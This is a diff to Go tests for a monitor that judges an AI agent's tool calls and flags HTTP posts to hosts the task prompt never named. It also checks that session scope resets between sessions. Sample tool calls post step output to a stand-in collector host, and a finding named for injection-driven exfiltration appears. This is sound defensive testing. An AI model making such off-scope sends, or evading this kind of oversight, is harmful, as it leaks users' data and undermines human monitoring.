@@ -99,8 +99,8 @@ func TestApplyIntentScopeFloor(t *testing.T) {
 	if got := applyIntentScopeFloor(nil, "scope"); got == nil || got.Severity != "MEDIUM" {
 		t.Fatalf("no verdict must become the scope alert: %+v", got)
 	}
-	if got := applyIntentScopeFloor(&ScanVerdict{JudgeFailed: true, Scanner: "llm-judge-tool"}, "scope"); got == nil || !got.JudgeFailed || !got.judgeFailedUnderFloor || got.Severity != "MEDIUM" {
-		t.Fatalf("the scope alert must ride next to a judge failure, not replace it: %+v", got)
+	if got := applyIntentScopeFloor(&ScanVerdict{JudgeFailed: true, Scanner: "llm-judge-tool"}, "scope"); got == nil || got.JudgeFailed || got.Severity != "MEDIUM" {
+		t.Fatalf("with a failed judge the scope alert is the verdict: %+v", got)
 	}
 	high := &ScanVerdict{Action: "block", Severity: "CRITICAL", Findings: []string{"JUDGE-TOOL-INJ-EXFIL"}}
 	if got := applyIntentScopeFloor(high, "scope"); got != high {
@@ -122,7 +122,7 @@ func TestToolJudgeScopeFloorEndToEnd(t *testing.T) {
 	ctx := ContextWithSessionID(context.Background(), "scope-e2e")
 	judge.ObserveSessionPrompt(ctx, "Research the current price of AAPL and summarize analyst sentiment.")
 
-	v := judge.RunToolJudge(ctx, "http.post", `{"url":"https://collector.other.example/ingest","body_ref":"step_5"}`)
+	v := judgeWithScopeFloor(judge, ctx, "http.post", `{"url":"https://collector.other.example/ingest","body_ref":"step_5"}`)
 	if v == nil || v.Severity == "NONE" || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
 		t.Fatalf("an off-scope send must be an alert, got %+v", v)
 	}
@@ -134,14 +134,14 @@ func TestToolJudgeScopeFloorEndToEnd(t *testing.T) {
 		t.Fatalf("the sample must say the task names no target:\n%s", user)
 	}
 
-	v = judge.RunToolJudge(ctx, "http.get", `{"url":"https://collector.other.example/page"}`)
+	v = judgeWithScopeFloor(judge, ctx, "http.get", `{"url":"https://collector.other.example/page"}`)
 	if v == nil || strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
 		t.Fatalf("a read must not get the scope alert: %+v", v)
 	}
 
 	named := ContextWithSessionID(context.Background(), "scope-e2e-named")
 	judge.ObserveSessionPrompt(named, "Post the numbers to https://collector.other.example/ingest.")
-	v = judge.RunToolJudge(named, "http.post", `{"url":"https://collector.other.example/ingest","body_ref":"step_5"}`)
+	v = judgeWithScopeFloor(judge, named, "http.post", `{"url":"https://collector.other.example/ingest","body_ref":"step_5"}`)
 	if v == nil || strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
 		t.Fatalf("a send to a destination the task names must not get the scope alert: %+v", v)
 	}
@@ -163,15 +163,15 @@ func TestSessionScopeCarriesEarlierPromptTargets(t *testing.T) {
 	judge.ObserveSessionPrompt(ctx, "Upload the artifacts to https://artifacts.corp.example/builds.")
 	judge.ObserveSessionPrompt(ctx, "continue")
 	post := `{"url":"https://artifacts.corp.example/builds/7","body_ref":"step_1"}`
-	if v := judge.RunToolJudge(ctx, "http.post", post); v == nil || strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
+	if v := judgeWithScopeFloor(judge, ctx, "http.post", post); v == nil || strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
 		t.Fatalf("a destination an earlier prompt named must be in scope: %+v", v)
 	}
-	if v := judge.RunToolJudge(ctx, "http.post", `{"url":"https://other.example/in"}`); v == nil || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
+	if v := judgeWithScopeFloor(judge, ctx, "http.post", `{"url":"https://other.example/in"}`); v == nil || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
 		t.Fatalf("a destination no prompt named must still be flagged: %+v", v)
 	}
 	judge.ResetToolJudgeSession(sandboxSessionStateKey(ctx, "scope-session"))
 	judge.ObserveSessionPrompt(ctx, "continue")
-	if v := judge.RunToolJudge(ctx, "http.post", post); v == nil || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
+	if v := judgeWithScopeFloor(judge, ctx, "http.post", post); v == nil || !strings.Contains(strings.Join(v.Findings, ","), intentScopeFinding) {
 		t.Fatalf("a new session must not inherit the old session's scope: %+v", v)
 	}
 }
